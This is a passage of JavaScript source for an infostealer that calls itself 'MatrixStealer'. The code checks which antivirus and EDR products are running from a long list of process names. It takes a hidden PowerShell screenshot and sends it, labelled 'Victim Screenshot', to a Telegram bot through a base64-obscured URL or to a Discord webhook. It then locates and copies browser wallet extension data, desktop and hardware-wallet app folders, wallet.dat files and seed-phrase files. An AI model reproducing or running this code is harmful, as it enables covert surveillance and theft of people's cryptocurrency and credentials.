        { name: 'Kaspersky', processes: ['Kaspersky.exe', 'ksde.exe', 'kav.exe', 'avp.exe', 'klnagent.exe', 'kavfssvc.exe'] },
        { name: 'BitDefender', processes: ['BitDefender.exe', 'bdagent.exe', 'bdwtxag.exe', 'vsserv.exe', 'bdredline.exe'] },
        { name: 'Windows Defender', processes: ['MsMpEng.exe', 'SecurityHealthService.exe', 'MsSense.exe', 'SenseCncProxy.exe'] },
        { name: 'ESET', processes: ['ekrn.exe', 'egui.exe', 'esets_svc.exe', 'esets_gui.exe'] },
        { name: 'AVG', processes: ['AVG.exe', 'avgui.exe', 'avgsvc.exe', 'avgwdsvc.exe', 'avgidsagent.exe'] },
        { name: 'Malwarebytes', processes: ['MBAMService.exe', 'MBAMTray.exe', 'MBAMScheduler.exe', 'mbam.exe'] },
        { name: 'Sophos', processes: ['SophosUI.exe', 'SophosAV.exe', 'SophosED.exe', 'SophosFS.exe', 'SophosHealth.exe'] },
        { name: 'Trend Micro', processes: ['tmntsrv.exe', 'tmproxy.exe', 'tmlisten.exe', 'PccNTMon.exe', 'Ntrtscan.exe'] },
        { name: 'Panda', processes: ['PSUAService.exe', 'PavFnSvr.exe', 'PavPrSrv.exe', 'Panda_URL_Filtering.exe'] },
        { name: 'Avira', processes: ['avguard.exe', 'avgnt.exe', 'avshadow.exe', 'Avira.ServiceHost.exe'] },
        { name: 'Comodo', processes: ['cmdagent.exe', 'cis.exe', 'CisTray.exe', 'cfp.exe'] },
        { name: 'F-Secure', processes: ['fsaua.exe', 'fsav.exe', 'fshoster32.exe', 'fsorsp.exe'] },
        { name: 'ZoneAlarm', processes: ['zlclient.exe', 'vsmon.exe', 'ZoneAlarm.exe'] },
        { name: 'Webroot', processes: ['WRSA.exe', 'WRSVC.exe', 'WRCoreService.exe'] },
        { name: 'BullGuard', processes: ['BullGuardAV.exe', 'BullGuardTray.exe', 'BullGuardScanner.exe'] },
        { name: 'VIPRE', processes: ['SBAMSvc.exe', 'VIPREUI.exe', 'SBAMTray.exe'] },
        { name: 'G Data', processes: ['AVK.exe', 'GDScan.exe', 'AVKTray.exe'] },
        { name: 'Emsisoft', processes: ['a2service.exe', 'a2guard.exe', 'a2start.exe'] },
        { name: 'IObit', processes: ['IMFsrv.exe', 'ASC.exe', 'HipsDaemon.exe'] },
        { name: '360 Total Security', processes: ['360Tray.exe', '360sd.exe', '360rp.exe', 'ZhuDongFangYu.exe'] },
        { name: 'Qihoo 360', processes: ['360Safe.exe', 'ZhuDongFangYu.exe', '360Tray.exe'] },
        { name: 'Tencent', processes: ['QQPCMgr.exe', 'QQPCTray.exe', 'QQPCRTP.exe'] },
        { name: 'Baidu', processes: ['BaiduSdSvc.exe', 'BaiduSdTray.exe', 'BaiduSd.exe'] },
        { name: 'Rising', processes: ['RsMgrSvc.exe', 'RsTray.exe', 'Rising.exe'] },
        { name: 'Kingsoft', processes: ['KAVStart.exe', 'KSWebShield.exe', 'kwsprotect64.exe'] },
        { name: 'Jiangmin', processes: ['KVMonXP.exe', 'KVXP.exe', 'KVFW.exe'] },
        { name: 'Dr.Web', processes: ['dwengine.exe', 'dwarkdaemon.exe', 'dwscanner.exe'] },
        { name: 'Bkav', processes: ['BkavService.exe', 'BkavTray.exe', 'BkavPro.exe'] },
        { name: 'ClamAV', processes: ['clamd.exe', 'freshclam.exe', 'clamscan.exe'] },
        { name: 'Fortinet', processes: ['FortiTray.exe', 'FortiClient.exe', 'FortiESNAC.exe'] },
        { name: 'Check Point', processes: ['cpda.exe', 'cpep.exe', 'cpoca.exe'] },
        { name: 'Cisco', processes: ['csc.exe', 'csagent.exe', 'ciscoamp.exe'] },
        { name: 'Symantec', processes: ['smc.exe', 'smcgui.exe', 'rtvscan.exe', 'ccSvcHst.exe'] },
        { name: 'CrowdStrike', processes: ['CSFalconService.exe', 'CSFalcon.exe', 'CSFalconContainer.exe'] },
        { name: 'SentinelOne', processes: ['SentinelAgent.exe', 'SentinelUI.exe', 'SentinelServiceHost.exe'] },
        { name: 'Carbon Black', processes: ['cb.exe', 'cbcomms.exe', 'RepMgr.exe', 'RepUtils.exe'] },
        { name: 'Cylance', processes: ['CylanceSvc.exe', 'CylanceUI.exe', 'CylancePROTECT.exe'] },
        { name: 'Darktrace', processes: ['dtagent.exe', 'dtui.exe', 'DarktraceSvc.exe'] },
        { name: 'FireEye', processes: ['xagt.exe', 'xagtnotif.exe', 'xagtnotif.exe'] },
        { name: 'Palo Alto', processes: ['PanGPS.exe', 'PanGPA.exe', 'PanMS.exe'] },
        { name: 'Proofpoint', processes: ['PPSX.exe', 'PPActiveDetection.exe', 'ProofpointTAP.exe'] },
        { name: 'Zscaler', processes: ['ZSATray.exe', 'ZSAgent.exe', 'Zscaler.exe'] },
        { name: 'Forcepoint', processes: ['fpavserver.exe', 'fpclient.exe', 'Forcepoint.exe'] },
        { name: 'Blue Coat', processes: ['bcs.exe', 'bcsservice.exe', 'BlueCoat.exe'] },
        { name: 'Websense', processes: ['websense.exe', 'wepsvc.exe', 'WebsenseControl.exe'] },
        { name: 'NetWitness', processes: ['nwsvc.exe', 'nwui.exe', 'NetWitness.exe'] },
        { name: 'RSA', processes: ['rsa.exe', 'rsaservice.exe', 'RSAArcher.exe'] },
        { name: 'Ad-Aware', processes: ['AdAwareService.exe', 'AdAwareTray.exe', 'AdAware.exe'] },
        { name: 'AhnLab', processes: ['V3Svc.exe', 'V3UI.exe', 'V3Medic.exe'] },
        { name: 'Arcabit', processes: ['Arcabit.exe', 'ArcaAV.exe', 'ArcabitSvc.exe'] },
        { name: 'Authentium', processes: ['Authentium.exe', 'CommandAntivirus.exe', 'AuthentiumSvc.exe'] },
        { name: 'Cat Quick Heal', processes: ['qhwatchdog.exe', 'qhconsol.exe', 'QUHLPSVC.EXE'] },
        { name: 'CMC', processes: ['CMC.exe', 'CMCSvc.exe', 'CMCAgent.exe'] },
        { name: 'eSafe', processes: ['eSafe.exe', 'eSafeSvc.exe', 'eSafeAgent.exe'] },
        { name: 'eTrust', processes: ['VetMsg.exe', 'VetTray.exe', 'eTrust.exe'] },
        { name: 'F-Prot', processes: ['FProtTray.exe', 'FProtSvc.exe', 'FProt.exe'] },
        { name: 'Grisoft', processes: ['avgcc.exe', 'avgw.exe', 'Grisoft.exe'] },
        { name: 'Hacksoft', processes: ['Hacksoft.exe', 'HacksoftSvc.exe', 'HacksoftAgent.exe'] },
        { name: 'Hauri', processes: ['Hauri.exe', 'HauriSvc.exe', 'HauriAgent.exe'] },
        { name: 'IKARUS', processes: ['IKARUS.exe', 'IKARUSSvc.exe', 'IKARUSAgent.exe'] },
        { name: 'Jetico', processes: ['Jetico.exe', 'JeticoSvc.exe', 'JeticoAgent.exe'] },
        { name: 'K7 Computing', processes: ['K7TSecurity.exe', 'K7TSMain.exe', 'K7TSAgent.exe'] },
        { name: 'Norman', processes: ['Norman.exe', 'NormanSvc.exe', 'NormanAgent.exe'] },
        { name: 'PC Tools', processes: ['PCTools.exe', 'PCToolsSvc.exe', 'PCToolsAgent.exe'] },
        { name: 'Prevx', processes: ['Prevx.exe', 'PrevxSvc.exe', 'PrevxAgent.exe'] },
        { name: 'Secure Computing', processes: ['SecureComputing.exe', 'SecureComputingSvc.exe', 'SecureComputingAgent.exe'] },
        { name: 'SecureWave', processes: ['SecureWave.exe', 'SecureWaveSvc.exe', 'SecureWaveAgent.exe'] },
        { name: 'Sunbelt', processes: ['Sunbelt.exe', 'SunbeltSvc.exe', 'SunbeltAgent.exe'] },
        { name: 'The Hacker', processes: ['TheHacker.exe', 'TheHackerSvc.exe', 'TheHackerAgent.exe'] },
        { name: 'UNA', processes: ['UNA.exe', 'UNASvc.exe', 'UNAAgent.exe'] },
        { name: 'VirusBuster', processes: ['VirusBuster.exe', 'VirusBusterSvc.exe', 'VirusBusterAgent.exe'] }
    ];

    try {
        const { stdout } = await execAsync('tasklist /FO CSV /NH');
        const lines = stdout.split('\n');
        const runningProcesses = new Set();
        for (const line of lines) {
            const parts = line.split(',');
            if (parts.length > 0) {
                const imageName = parts[0].replace(/"/g, '');
                runningProcesses.add(imageName.toLowerCase());
            }
        }

        for (const av of avList) {
            for (const proc of av.processes) {
                if (runningProcesses.has(proc.toLowerCase())) {
                    detected.push(av.name);
                    break;
                }
            }
        }
    } catch (e) {
        // ignore
    }

    return [...new Set(detected)];
}

async function sendScreenshotToWebhook() {
    try {
        const psCommand = `Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $memoryStream = New-Object System.IO.MemoryStream; $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png); $bytes = $memoryStream.ToArray(); [System.Console]::OpenStandardOutput().Write($bytes, 0, $bytes.Length); $bitmap.Dispose(); $graphics.Dispose(); $memoryStream.Dispose();`;

        const img = execSync(`powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "${psCommand}"`, { encoding: null, maxBuffer: 10 * 1024 * 1024 });

        if (CONFIG.logMethod === 'telegram') {
            const { token, chatId } = CONFIG.telegram;
            if (token && chatId) {
                const _d = (s) => Buffer.from(s, 'base64').toString();
                const tgBase = _d('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn');
                const tgBot = _d('Ym90');
                const tgPhoto = _d('c2VuZFBob3Rv');

                const form = new FormData();
                form.append('chat_id', chatId);
                form.append('photo', img, { filename: 'screenshot.png' });
                form.append('caption', 'Victim Screenshot\nMatrixStealer | Hardware Authenticated');
                
                await axios.post(`${tgBase}/${tgBot}${token}/${tgPhoto}`, form, {
                    headers: form.getHeaders()
                });
            }
        } else {
            const form = new FormData();
            const embed = {
                title: 'Victim Screenshot',
                color: 0xFF0000, // Red
                image: {
                    url: 'attachment://screenshot.png'
                },
                footer: {
                    text: 'MatrixStealer | Hardware Authenticated'
                },
                timestamp: new Date().toISOString()
            };

            form.append('payload_json', JSON.stringify({
                username: "MatrixStealer",
                avatar_url: "https://imgur.com/a/uJ6eadF",
                embeds: [embed]
            }));

            form.append('file', img, {
                filename: 'screenshot.png',
                contentType: 'image/png'
            });

            await axios.post(CONFIG.webhook, form, {
                headers: form.getHeaders(),
                maxContentLength: Infinity,
                maxBodyLength: Infinity
            });
        }

        console.log('[+] Screenshot sent successfully');
    } catch (error) {
        console.error('[-] Screenshot error:', error.message);
    }
}

// ========================================
// WALLET EXTRACTION FUNCTIONS
// ========================================

const browserWalletPaths = {
    Chrome: {
        base: path.join(localappdata, 'Google', 'Chrome', 'User Data'),
        wallets: {
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
            'Coinbase Wallet': 'hnfanknocfeofbddgcijnmhnfnkdnaad',
            'Binance Wallet': 'fhbohimaelbohpjbbldcngcnapndodjp',
            'Trust Wallet': 'egjidjbpglichdcondbcbdnbeeppgdph',
            'Exodus': 'aholpfdialjgjfhomihkjbmgjidlcdno',
            'Atomic Wallet': 'fhilaheimglignddkjgofkcbgekhenbh',
            'Math Wallet': 'afbcbjpbpfadlkmhmclhkeeodmamcflc',
            'BitKeep': 'jiidiaalihmmhddjgbnbgdfflelocpak',
            'OKX Wallet': 'mcohilncbfahbmgdjkbpemcciiolgcge',
            'Rabby Wallet': 'acmacodkjbdgmoleebolmdjonilkdbch',
            'XDEFI Wallet': 'hmeobnfnfcmdkdcmlblgagmfpfboieaf',
            'SafePal': 'lgmpcpglpngdoalbgeoldeajfclnhafa',
            'Keplr': 'dmkamcknogkgcdfhhbddcghachkejeap',
            'Terra Station': 'aiifbnbfobpmeekipheeijimdpnlpgpp',
            'Nami': 'lpfcbjknijpeeillifnkikgncikgfhdo',
            'Eternl': 'kmhcihpebfmpgmihbkipmjlmmioameka',
            'Yoroi': 'ffnbelfdoeiohenkjibnmadjiehjhajb',
            'TronLink': 'ibnejdfjmmkpcnlpebklmnkoeoihofec',
            'Ronin Wallet': 'fnjhmkhhmkbjkkabndcnnogagogbneec',
            'Liquality': 'kpfopkelmapcoipemfendmdcghnegimn',
            'Solflare': 'bhhhlbepdkbapadjdnnojkbgioiodbic',
            'Slope': 'pocmplpaccanhmnllbbkpgfliimjljgo',
            'Braavos': 'jnlgamecbpmbajjfhmmmlhejkemejdma',
            'Polymesh': 'jojhfeoedkpkglbfimdfabpdfjaoolaf',
            'ICONex': 'flpiciilemghbmfalicajoolhkkenfel',
            'Nabox': 'nknhiehlklippafakaeklbeglecifhad',
            'KardiaChain': 'pdadjkfkgcafgbceimcpbkalnfnepbnk',
            'Wombat': 'amkmjjmmflddogmhpjloimipbofnfjih',
            'MEW CX': 'nlbmnnijcnlegkjjpcfjclmcfggfefdm',
            'Guarda': 'hpglfhgfnhbgpjdenjgmdgoeiappafln',
            'EVER Wallet': 'cgeeodpfagjceefieflmdfphplkenlfk',
            'Clover': 'nhnkbkgjikgcigadomkphalanndcapjk',
            'Leather (Hiro)': 'ldinpeekobnhjjdofggfgjlcehhmanlj',
            'Sui Wallet': 'opcgpfmipidbgpenhmajoajpbobppdil',
            'Petra Aptos': 'ejjladinnckdgjemekebdpeokbikhfci',
            'Martian Aptos': 'efbglgofoippbgcjepnhiblaibcnclgk',
            'Pontem Aptos': 'phkbamefinggmakgklpkljjmgibohnba',
            'Sender Wallet': 'epapihdplajcdnnkdeiahlgigofloibg',
            'Goby': 'jnkelfanjkeadonecabehalmbgpfodjm',
            'Leap Cosmos': 'fcfcfllfndlomdhbehjjcoimbgofdncg',
            'Core': 'agoakfejjabomempkjlepdflaleeobhb',
            'Harmony': 'fnnegphlobjdpkhecapkijjdkgcjhkib',
            'Enkrypt': 'kkpllkodjeloidieedojogacfhpaihoh',
            'Opera Wallet': 'nkddgncdjgjfcddamfgcmfnlhccnimig',
            'Rainbow': 'opfgelmcmbiajamepnmloijbpoleiama',
            'Zerion': 'klghhnkeealcohjjanjjdaeeggmfmlpl',
            'Talisman': 'fijngjgcjhjmmpcmkeiomlglpeiijkld',
            'Backpack': 'aflkmfhebedbjioipglgcbcmnbpgliof',
            'Fordefi': 'gnagcihlkglhdgaadhekmihmlnomkdei',
            'SubWallet': 'onhogfjeacnfoofkfgppdlbmlmnplgbn',
            'PolkadotJS': 'mopnmbcafieddcagagdcbnhejhlodfdd',
            'Compass': 'anokgmphncpekkhclmingpimjmcooifb',
            'OWallet': 'hhejbopdnpbjgomhpmegemnjdwerdhhl',
            'Cosmostation': 'fpkhgmpbidmiogeglndfbkegfdlnajnf',
            'Frontier': 'kppfdiipphfccemcignhifpjkapfbihd',
            'Bifrost': 'gfbapjadghcjbjbimlgpnkjomgkkidlg',
            'Frame': 'ldcoohedfbjoobcadoglnnmmfbdlmmhf',
            'Noone': 'mjhibnmklpkhdfmhpgmihcikaclklkdb',
            'Temple': 'ookjlbkiijinhpmnjffcofjonbfbgaoc',
            'Beacon': 'gpfndedineagiepkpinficbcbbgjoenn',
            'Kukai': 'dhoiejdeibakejckcmgdcbakjdjoklco',
            'Spire': 'gpaigehiakghopkbbgpolppmojpckklm',
            'Umami': 'bkdaaifcdibjmbknjcmbagpepkbhfjhg',
            'Cyano': 'dkdedlpgdmmkkfjabffeganieamfklkm',
            'OneKey': 'jnmbobjmhlngoefaiojfljckilhhlhcj',
            'Safepal Extension': 'lgmpcpglpngdoalbgeoldeajfclnhafa',
            'Slope Finance': 'pocmplpaccanhmnllbbkpgfliimjljgo',
            'Coin98': 'aeachknmefphepccionboohckonoeemg',
            'TokenPocket': 'mfgccjchihfkkindfppnaooecgfneiii',
            'ioPay': 'ilgbfbicnkangdlofblackcoignjacni',
            'Auro': 'cnmamaachppnkjgnildpdlbmlmnplgbn',
            'Leafkey': 'bhmejakjdfmhfobdamfbpeocicjdajij',
            'OneKey (Legacy)': 'infeboajgfhgbjpjbeppbkgnabfdkdaf',
            'Nifty': 'jbdaocneiiinmjbjlgalhcelgbejmnid',
            'BoltX': 'aodkkagnadcbobfpggfnjeongemjbjca',
            'Liquality Wallet': 'kpfopkelmapcoipemfendmdcghnegimn',
            'Saturn': 'nkddgncdjgjfcddamfgcmfnlhccnimig',
            'Guild': 'nanjmdknhkinifnkgdcggcfnhdaammmj',
            'Taho (Tally Ho)': 'eajafomhmkipbjmfmhebemolkcicgfmd',
            'Xverse': 'idnnbdplmphpflfnlkomgpfbpcgelopg',
            'DeFi Wallet': 'klhkobkdpphfpioepbgjhdeomkdafgme',
            'Avail': 'kkpllkodjeloidieedojogacfhpaihoh',
            'MewCx': 'nlbmnnijcnlegkjjpcfjclmcfggfefdm',
            'Casper Signer': 'djhndpllfiibmcdbnmaaahkhchcoijce',
            'Subwallet Polkadot': 'onhogfjeacnfoofkfgppdlbmlmnplgbn',
            'Finnie': 'cjmkndjhnagcfbpiemnkdpomccnjblmj',
            'Stargazer': 'pgiaagfkgcbnmiiolekcfmljdagdhlcm',
            'Polymesh Wallet': 'jojhfeoedkpkglbfimdfabpdfjaoolaf',
            'Martian Wallet': 'efbglgofoippbgcjepnhiblaibcnclgk',
            'Maiar DeFi': 'dngmlblcodfobpdpecaadgfbcggfjfnm',
            'Flint Wallet': 'hnhobjmcibchnmglfbldbfabcgaknlkj',
            'Sender': 'epapihdplajcdnnkdeiahlgigofloibg',
            'Brave Wallet': 'odbfpeeihdkbihmopkbjmoonfanlbfcl'
        }
    },
    Edge: {
        base: path.join(localappdata, 'Microsoft', 'Edge', 'User Data'),
        wallets: {
            'MetaMask': 'ejbalbakoplchlghecdalmeeeajnimhm',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
            'Coinbase Wallet': 'hnfanknocfeofbddgcijnmhnfnkdnaad',
            'Binance Wallet': 'fhbohimaelbohpjbbldcngcnapndodjp',
            'Trust Wallet': 'egjidjbpglichdcondbcbdnbeeppgdph'
        }
    },
    Brave: {
        base: path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        wallets: {
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
            'Coinbase Wallet': 'hnfanknocfeofbddgcijnmhnfnkdnaad'
        }
    },
    Opera: {
        base: path.join(appData, 'Opera Software', 'Opera Stable'),
        wallets: {
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa'
        }
    },
    OperaGX: {
        base: path.join(appData, 'Opera Software', 'Opera GX Stable'),
        wallets: {
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa'
        }
    }
};

const desktopWalletPaths = {
    'Exodus': path.join(appData, 'Exodus', 'exodus.wallet'),
    'Atomic': path.join(appData, 'atomic', 'Local Storage', 'leveldb'),
    'Electrum': path.join(appData, 'Electrum', 'wallets'),
    'Ethereum': path.join(appData, 'Ethereum', 'keystore'),
    'Monero': path.join(appData, 'Monero'),
    'Bytecoin': path.join(appData, 'bytecoin'),
    'Jaxx Liberty': path.join(appData, 'com.liberty.jaxx', 'IndexedDB'),
    'Zcash': path.join(appData, 'Zcash'),
    'Armory': path.join(appData, 'Armory'),
    'Coinomi': path.join(localappdata, 'Coinomi', 'Coinomi', 'wallets'),
    'Guarda': path.join(appData, 'Guarda'),
    'Wasabi': path.join(appData, 'WalletWasabi', 'Client', 'Wallets'),
    'Bitcoin Core': path.join(appData, 'Bitcoin', 'wallets'),
    'Bitcoin': path.join(appData, 'Bitcoin'),
    'Litecoin': path.join(appData, 'Litecoin'),
    'Litecoin Core': path.join(appData, 'Litecoin', 'wallets'),
    'Dash Core': path.join(appData, 'DashCore', 'wallets'),
    'Dash': path.join(appData, 'DashCore'),
    'Dogecoin': path.join(appData, 'Dogecoin'),
    'Dogecoin Core': path.join(appData, 'Dogecoin', 'wallets'),
    'Daedalus': path.join(appData, 'Daedalus', 'wallets'),
    'Yoroi': path.join(appData, 'Yoroi'),
    'Nami': path.join(appData, 'Nami'),
    'Eternl': path.join(appData, 'eternl'),
    'MultiBit': path.join(appData, 'MultiBit'),
    'Binance': path.join(appData, 'Binance'),
    'com.liberty.jaxx': path.join(appData, 'com.liberty.jaxx', 'IndexedDB', 'file__0.indexeddb.leveldb')
};

const coldWalletPaths = {
    'Ledger Live': path.join(appData, 'Ledger Live'),
    'Ledger': path.join(appData, 'Ledger Live', 'Local Storage', 'leveldb'),
    'Trezor Suite': path.join(appData, 'Trezor Suite'),
    'Trezor': path.join(appData, 'Trezor Suite', 'IndexedDB'),
    'KeepKey': path.join(appData, 'KeepKey'),
    'BitBox': path.join(appData, 'BitBox')
};

async function extractBrowserWallets() {
    const extractedWallets = [];

    for (const [browserName, browserConfig] of Object.entries(browserWalletPaths)) {
        if (!fs.existsSync(browserConfig.base)) continue;

        const profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'];

        for (const profile of profiles) {
            const profilePath = path.join(browserConfig.base, profile);

            if (!fs.existsSync(profilePath)) continue;

            const extensionsPath = path.join(profilePath, 'Local Extension Settings');

            if (!fs.existsSync(extensionsPath)) continue;

            for (const [walletName, extensionId] of Object.entries(browserConfig.wallets)) {
                const walletPath = path.join(extensionsPath, extensionId);

                if (fs.existsSync(walletPath)) {
                    try {
                        const walletInfo = {
                            browser: browserName,
                            profile: profile,
                            wallet: walletName,
                            extensionId: extensionId,
                            path: walletPath,
                            files: []
                        };

                        const files = fs.readdirSync(walletPath);

                        for (const file of files) {
                            const filePath = path.join(walletPath, file);
                            const stat = fs.statSync(filePath);

                            if (stat.isFile()) {
                                walletInfo.files.push({
                                    name: file,
                                    size: stat.size,
                                    path: filePath
                                });
                            }
                        }

                        extractedWallets.push(walletInfo);

                    } catch (error) {
                        // Skip on error
                    }
                }
            }
        }
    }

    return extractedWallets;
}

async function copyBrowserWallets(wallets, outputDir) {
    const walletsDir = path.join(outputDir, 'Browser_Wallets');
    fs.mkdirSync(walletsDir, { recursive: true });

    for (const wallet of wallets) {
        const walletOutputDir = path.join(
            walletsDir,
            `${wallet.browser}_${wallet.profile}_${wallet.wallet}`.replace(/[<>:"/\\|?*]/g, '_')
        );

        fs.mkdirSync(walletOutputDir, { recursive: true });

        fs.writeFileSync(
            path.join(walletOutputDir, 'info.json'),
            JSON.stringify(wallet, null, 2),
            'utf8'
        );

        let totalSize = 0;
        const maxFileSize = 5 * 1024 * 1024;
        const maxWalletSize = 20 * 1024 * 1024;

        for (const file of wallet.files) {
            try {
                if (file.size > maxFileSize) continue;

                if (totalSize + file.size > maxWalletSize) break;

                const destPath = path.join(walletOutputDir, file.name);
                fs.copyFileSync(file.path, destPath);
                totalSize += file.size;
            } catch (error) {
                // Skip on error
            }
        }
    }

    return walletsDir;
}

async function extractDesktopWallets() {
    const extractedWallets = [];

    for (const [walletName, walletPath] of Object.entries(desktopWalletPaths)) {
        if (fs.existsSync(walletPath)) {
            try {
                const stat = fs.statSync(walletPath);

                const walletInfo = {
                    name: walletName,
                    path: walletPath,
                    type: stat.isDirectory() ? 'directory' : 'file',
                    size: stat.isFile() ? stat.size : null,
                    files: []
                };

                if (stat.isDirectory()) {
                    const files = getAllFilesWallet(walletPath, null, [], 0, 2);
                    walletInfo.files = files.slice(0, 30).map(f => {
                        try {
                            return {
                                name: path.relative(walletPath, f),
                                path: f,
                                size: fs.statSync(f).size
                            };
                        } catch (e) {
                            return null;
                        }
                    }).filter(f => f !== null);
                }

                extractedWallets.push(walletInfo);

            } catch (error) {
                // Skip on error
            }
        }
    }

    return extractedWallets;
}

async function copyDesktopWallets(wallets, outputDir) {
    const walletsDir = path.join(outputDir, 'Desktop_Wallets');
    fs.mkdirSync(walletsDir, { recursive: true });

    for (const wallet of wallets) {
        const walletOutputDir = path.join(
            walletsDir,
            wallet.name.replace(/[<>:"/\\|?*]/g, '_')
        );

        fs.mkdirSync(walletOutputDir, { recursive: true });

        fs.writeFileSync(
            path.join(walletOutputDir, 'info.json'),
            JSON.stringify(wallet, null, 2),
            'utf8'
        );

        if (wallet.type === 'directory') {
            const filesToCopy = wallet.files.slice(0, 70);

            for (const file of filesToCopy) {
                try {
                    const relativePath = file.name;
                    const destPath = path.join(walletOutputDir, relativePath);
                    const destDir = path.dirname(destPath);

                    fs.mkdirSync(destDir, { recursive: true });

                    if (file.size < 10 * 1024 * 1024) {
                        fs.copyFileSync(file.path, destPath);
                    }

                } catch (error) {
                    // Skip on error
                }
            }
        } else {
            try {
                const destPath = path.join(walletOutputDir, path.basename(wallet.path));
                fs.copyFileSync(wallet.path, destPath);
            } catch (error) {
                // Skip on error
            }
        }
    }

    return walletsDir;
}

async function extractColdWallets() {
    const extractedWallets = [];

    for (const [walletName, walletPath] of Object.entries(coldWalletPaths)) {
        if (fs.existsSync(walletPath)) {
            try {
                const stat = fs.statSync(walletPath);

                const walletInfo = {
                    name: walletName,
                    path: walletPath,
                    type: stat.isDirectory() ? 'directory' : 'file',
                    files: []
                };

                if (stat.isDirectory()) {
                    const files = getAllFilesWallet(walletPath, null, [], 0, 2);
                    walletInfo.files = files.slice(0, 30).map(f => {
                        try {
                            return {
                                name: path.relative(walletPath, f),
                                path: f,
                                size: fs.statSync(f).size
                            };
                        } catch (e) {
                            return null;
                        }
                    }).filter(f => f !== null);
                }

                extractedWallets.push(walletInfo);

            } catch (error) {
                // Skip on error
            }
        }
    }

    return extractedWallets;
}

async function copyColdWallets(wallets, outputDir) {
    const walletsDir = path.join(outputDir, 'Cold_Wallets');
    fs.mkdirSync(walletsDir, { recursive: true });

    for (const wallet of wallets) {
        const walletOutputDir = path.join(
            walletsDir,
            wallet.name.replace(/[<>:"/\\|?*]/g, '_')
        );

        fs.mkdirSync(walletOutputDir, { recursive: true });

        fs.writeFileSync(
            path.join(walletOutputDir, 'info.json'),
            JSON.stringify(wallet, null, 2),
            'utf8'
        );

        if (wallet.type === 'directory') {
            const filesToCopy = wallet.files.slice(0, 50);

            for (const file of filesToCopy) {
                try {
                    const relativePath = file.name;
                    const destPath = path.join(walletOutputDir, relativePath);
                    const destDir = path.dirname(destPath);

                    fs.mkdirSync(destDir, { recursive: true });

                    if (file.size < 10 * 1024 * 1024) {
                        fs.copyFileSync(file.path, destPath);
                    }

                } catch (error) {
                    // Skip on error
                }
            }
        }
    }

    return walletsDir;
}

async function findWalletDatFiles() {
    const walletFiles = [];
    const searchPaths = [
        path.join(appData, 'Bitcoin'),
        path.join(appData, 'Litecoin'),
        path.join(appData, 'Dogecoin'),
        path.join(appData, 'DashCore'),
        path.join(appData, 'Ethereum'),
        path.join(appData, 'Monero')
    ];

    for (const searchPath of searchPaths) {
        if (!fs.existsSync(searchPath)) continue;

        try {
            const files = getAllFilesWallet(searchPath, 'wallet.dat', [], 0, 2);

            for (const file of files) {
                try {
                    const stat = fs.statSync(file);
                    walletFiles.push({
                        path: file,
                        size: stat.size,
                        modified: stat.mtime
                    });
                } catch (e) {
                    // Skip
                }
            }
        } catch (error) {
            // Ignore access errors
        }
    }

    return walletFiles;
}

async function copyWalletDatFiles(walletFiles, outputDir) {
    const walletDatDir = path.join(outputDir, 'WalletDat_Files');
    fs.mkdirSync(walletDatDir, { recursive: true });

    for (let i = 0; i < walletFiles.length; i++) {
        const wallet = walletFiles[i];
        const fileName = `wallet_${i + 1}_${path.basename(path.dirname(wallet.path))}.dat`;
        const destPath = path.join(walletDatDir, fileName);

        try {
            fs.copyFileSync(wallet.path, destPath);
        } catch (error) {
            // Skip on error
        }
    }

    return walletDatDir;
}

async function findSeedPhrases() {
    const seedFiles = [];
    const searchPaths = [
        path.join(os.homedir(), 'Desktop'),
        path.join(os.homedir(), 'Documents')
    ];

    const seedPatterns = [
        /seed/i,
        /mnemonic/i,
        /recovery.*phrase/i,
        /private.*key/i,
        /wallet.*backup/i,
        /crypto.*backup/i
    ];

    const skipPatterns = [
        /discord/i,
        /backup.*codes/i
    ];

    for (const searchPath of searchPaths) {
        if (!fs.existsSync(searchPath)) continue;

        try {
            const files = getAllFilesWallet(searchPath, null, [], 0, 1).filter(file => {
                const ext = path.extname(file).toLowerCase();
                return ext === '.txt' || ext === '.doc' || ext === '.docx';
            });

            for (const file of files) {
                const fileName = path.basename(file).toLowerCase();

                if (skipPatterns.some(pattern => pattern.test(fileName))) {
                    continue;
                }

                if (seedPatterns.some(pattern => pattern.test(fileName))) {
                    try {
                        const stat = fs.statSync(file);
                        if (stat.size < 1024 * 1024) {
                            seedFiles.push({
                                path: file,
                                size: stat.size,
                                name: path.basename(file)
                            });
                        }
                    } catch (e) {
                        // Skip
                    }
                }
            }
        } catch (error) {
            // Ignore
        }
    }

    return seedFiles;
}

async function copySeedFiles(seedFiles, outputDir) {
    const seedDir = path.join(outputDir, 'Seed_Phrases');
    fs.mkdirSync(seedDir, { recursive: true });

    for (const file of seedFiles) {
        try {
            const destPath = path.join(seedDir, file.name);
            fs.copyFileSync(file.path, destPath);
        } catch (error) {
            // Skip on error
        }
    }

    return seedDir;
}

function getAllFilesWallet(dir, targetFileName = null, fileList = [], depth = 0, maxDepth = 3) {
    if (depth > maxDepth) return fileList;

    try {
        const files = fs.readdirSync(dir);

        for (const file of files) {
            if (file === 'node_modules' || file === '.git' || file === 'cache' || file === 'Cache') {
                continue;
            }

            const filePath = path.join(dir, file);

            try {
                const stat = fs.statSync(filePath);

                if (stat.isDirectory()) {
                    getAllFilesWallet(filePath, targetFileName, fileList, depth + 1, maxDepth);
                } else {
